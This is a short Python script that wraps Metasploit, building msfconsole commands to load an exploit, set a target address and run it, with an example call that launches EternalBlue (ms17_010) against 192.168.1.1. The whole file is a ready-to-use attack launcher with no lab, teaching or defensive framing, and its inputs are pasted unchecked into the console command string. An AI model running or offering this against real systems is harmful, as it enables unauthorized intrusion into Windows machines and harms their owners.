import subprocess

def launch_metasploit_with_exploit(exploit, target_ip):
    """
    Launch Metasploit and execute a predefined exploit.

    Args:
    exploit (str): The exploit to use (e.g., exploit/windows/smb/ms17_010_eternalblue).
    target_ip (str): The target IP address.

    Returns:
    None
    """
    print(f"Launching Metasploit with exploit: {exploit} on target: {target_ip}")
    commands = [
        f"use {exploit}",
        f"set RHOST {target_ip}",
        "run"
    ]
    subprocess.run(["msfconsole", "-q", "-x", "; ".join(commands)])

# Example usage
launch_metasploit_with_exploit("exploit/windows/smb/ms17_010_eternalblue", "192.168.1.1")
